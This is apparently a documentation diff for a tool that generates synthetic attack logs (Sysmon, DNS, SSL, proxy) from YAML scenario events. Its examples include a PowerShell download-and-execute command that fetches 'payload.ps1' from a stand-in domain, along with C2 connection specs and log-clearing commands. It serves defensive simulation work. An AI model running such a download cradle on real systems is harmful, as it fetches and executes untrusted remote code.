@@ -394,19 +394,29 @@ The `raw` type targets a specific output format with arbitrary fields — use it
 events:
   - type: process
     process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')\""
+    command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://cdn-assets-update.com/payload.ps1')\""
     technique: "T1059.001 - PowerShell"
+  - type: connection               # Pair with connection so domain appears in DNS/SSL/proxy
+    dst_ip: "203.0.113.50"
+    dst_port: 443
+    hostname: "cdn-assets-update.com"
+    service: ssl
 ```
+
+IMPORTANT: When a process command line references a domain URL (Invoke-WebRequest, DownloadString, curl, wget), always add a paired `connection` event with `hostname` set. Without it, the domain will appear in Sysmon but be completely absent from DNS, SSL, HTTP, and proxy logs — a glaring cross-source inconsistency. For raw-IP URLs, the connection alone (without `hostname`) is sufficient.
 
 **Network connections (C2, exfiltration):**
 
 IMPORTANT: For C2 and exfiltration connections, always specify `method`, `uri`, and `user_agent` when using `service: http`. Without these fields, the engine auto-generates generic HTTP metadata (random URIs like `/favicon.ico`) that won't reflect the actual attack activity in Zeek http.log or proxy logs. For `service: ssl` (HTTPS), the HTTP layer is encrypted and not visible to Zeek, so these fields aren't needed — but the connection will still appear in conn.log and ssl.log.
+
+IMPORTANT: When a connection uses a domain name (not a raw IP), set `hostname` on the connection event. This ensures the domain appears in DNS, SSL SNI, x509 certificate subject, and proxy logs. Without it, these logs either miss the domain or use a random hostname. Omit `hostname` for raw-IP C2 (no DNS lookup expected).
 
 ```yaml
 events:
   - type: connection
     dst_ip: "198.51.100.10"
     dst_port: 443
+    hostname: "cdn-assets-update.com"   # Domain for DNS/SSL/proxy
     service: "ssl"
     technique: "T1071.001 - Web Protocols"
 ```
@@ -469,7 +479,7 @@ events:
 
 **Causal expansion — auto-generated prerequisite events:** The generation engine automatically emits prerequisite and consequent events with realistic timing offsets. You do NOT need to manually specify these as prerequisites:
 
-- **DNS before connections** — TCP connections auto-generate a DNS lookup (5-80ms before) with caching, SERVFAIL probability, and NXDOMAIN companions. Baseline web/SaaS connections use domain-first selection for consistent DNS/SNI/proxy hostnames. Storyline connections to raw C2 IPs (not in REVERSE_DNS) skip DNS emission — realistic for direct-IP C2 beaconing
+- **DNS before connections** — TCP connections auto-generate a DNS lookup (5-80ms before) with caching, SERVFAIL probability, and NXDOMAIN companions. Baseline web/SaaS connections use domain-first selection for consistent DNS/SNI/proxy hostnames. Storyline connections with `hostname` set always emit DNS; connections without `hostname` skip DNS (correct for raw-IP C2)
 - **Kerberos before logons** — Kerberos-authenticated Windows domain logons auto-generate TGT (4768) and TGS (4769) on the DC, plus 4672 for elevated users
 - **ProcessAccess after lsass injection** — `create_remote_thread` targeting lsass.exe auto-generates Sysmon Event 10 (1-50ms after)
 - **Audit events from commands** — Process events with admin commands (`net user /add`, `sc create`, `schtasks /create`, `wevtutil cl`) auto-generate the corresponding Windows audit events (4720, 4726, 4728, 4697, 4698, 1102)
